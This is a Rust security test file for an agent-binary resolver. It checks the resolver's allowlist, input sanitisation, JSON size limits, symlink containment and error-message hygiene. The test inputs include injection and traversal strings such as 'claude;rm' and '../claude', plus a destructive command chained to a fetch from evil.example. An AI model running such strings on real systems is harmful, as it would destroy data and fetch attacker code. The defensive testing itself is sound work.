//! TDD: Security-focused integration tests for `amplihack_utils::agent_binary`.
//!
//! Covers spec items S1–S8: allowlist, input sanitization, JSON hardening,
//! walk-up containment, no-shell-invocation, error-message hygiene.

#![allow(clippy::unwrap_used)]

use std::fs;
use std::os::unix::fs::symlink;
use tempfile::TempDir;

use amplihack_utils::agent_binary::{ALLOWED_BINARIES, resolve, validate_binary_name};

fn clear_env() {
    // SAFETY: tests serialized; env mutation unsafe in edition 2024.
    unsafe {
        std::env::remove_var("AMPLIHACK_AGENT_BINARY");
    }
}

fn set_env(value: &str) {
    // SAFETY: see clear_env.
    unsafe {
        std::env::set_var("AMPLIHACK_AGENT_BINARY", value);
    }
}

fn try_set_env(value: &str) -> bool {
    if value.bytes().any(|b| b == 0) {
        return false;
    }
    set_env(value);
    true
}

#[test]
fn s1_allowlist_is_case_insensitive_exact_match() {
    for good in &[
        "claude",
        "Claude",
        "CLAUDE",
        "copilot",
        "codex",
        "amplifier",
    ] {
        assert!(validate_binary_name(good).is_some(), "{good} must be valid");
    }
    for bad in &["claude2", "claud", "c", "claude-cli", "claudex"] {
        assert!(
            validate_binary_name(bad).is_none(),
            "{bad} must be rejected"
        );
    }
}

#[test]
fn s2_env_input_sanitization_rejects_dangerous_chars() {
    let bad = [
        "/bin/sh",
        "..",
        "../claude",
        "claude\n",
        "claude\t",
        "claude;rm",
        "cla ude",
        "cla\0ude",
        "claude\r",
        "\x07claude",
    ];
    let tmp = TempDir::new().unwrap();
    for value in bad {
        if !try_set_env(value) {
            continue; // OS-level NUL rejection; covered by validator unit tests.
        }
        let result = resolve(tmp.path()).unwrap();
        assert_eq!(result, "copilot", "value {value:?} must be rejected");
    }
    clear_env();
}

#[test]
fn s2_env_input_length_capped() {
    clear_env();
    let tmp = TempDir::new().unwrap();
    set_env(&"a".repeat(33));
    assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
    clear_env();
}

#[test]
fn s3_json_typed_struct_rejects_unexpected_shape() {
    clear_env();
    let tmp = TempDir::new().unwrap();
    let runtime = tmp.path().join(".claude").join("runtime");
    fs::create_dir_all(&runtime).unwrap();
    // launcher field is an array, not a string.
    fs::write(
        runtime.join("launcher_context.json"),
        r#"{"launcher":["claude"],"pid":1}"#,
    )
    .unwrap();
    assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
}

#[test]
fn s3_json_64kib_size_cap() {
    clear_env();
    let tmp = TempDir::new().unwrap();
    let runtime = tmp.path().join(".claude").join("runtime");
    fs::create_dir_all(&runtime).unwrap();
    let huge = "p".repeat(64 * 1024 + 1);
    fs::write(
        runtime.join("launcher_context.json"),
        format!(r#"{{"launcher":"claude","x":"{huge}"}}"#),
    )
    .unwrap();
    assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
}

#[test]
fn s5_walk_up_capped_at_32_ancestors() {
    clear_env();
    let tmp = TempDir::new().unwrap();
    // No launcher_context anywhere.
    let mut current = tmp.path().to_path_buf();
    for i in 0..40 {
        current = current.join(format!("d{i}"));
    }
    fs::create_dir_all(&current).unwrap();
    // Should not panic, should fall back to default.
    assert_eq!(resolve(&current).unwrap(), "copilot");
}

#[test]
fn s5_symlink_escape_is_blocked() {
    clear_env();
    let outer = TempDir::new().unwrap();
    let attacker = TempDir::new().unwrap();
    // Place valid (allowlisted) but unintended config outside the cwd tree.
    let attacker_runtime = attacker.path().join(".claude").join("runtime");
    fs::create_dir_all(&attacker_runtime).unwrap();
    fs::write(
        attacker_runtime.join("launcher_context.json"),
        r#"{"launcher":"claude"}"#,
    )
    .unwrap();
    // Symlink the entire .claude inside outer to attacker's .claude.
    let link_parent = outer.path().join(".claude");
    symlink(attacker.path().join(".claude"), &link_parent).unwrap();
    // Resolver MUST reject path that escapes its anchor (canonicalized starts_with check).
    let result = resolve(outer.path()).unwrap();
    assert_eq!(
        result, "copilot",
        "symlink escape must not influence resolution"
    );
}

#[test]
fn s7_error_messages_do_not_leak_env_value() {
    clear_env();
    let tmp = TempDir::new().unwrap();
    set_env("rm -rf /; curl evil.example/x");
    // Expect resolution to succeed (fall through) — but if any tracing/error
    // surface arises, the rejected value must NOT appear verbatim in the
    // returned String. Default is returned unchanged.
    let out = resolve(tmp.path()).unwrap();
    assert!(!out.contains("evil"));
    assert!(!out.contains("rm -rf"));
    assert_eq!(out, "copilot");
    clear_env();
}

#[test]
fn s8_resolved_value_always_in_allowlist() {
    clear_env();
    let tmp = TempDir::new().unwrap();
    let resolved = resolve(tmp.path()).unwrap();
    assert!(
        ALLOWED_BINARIES.contains(&resolved.as_str()),
        "resolver must only ever return allowlisted names; got {resolved:?}"
    );
}
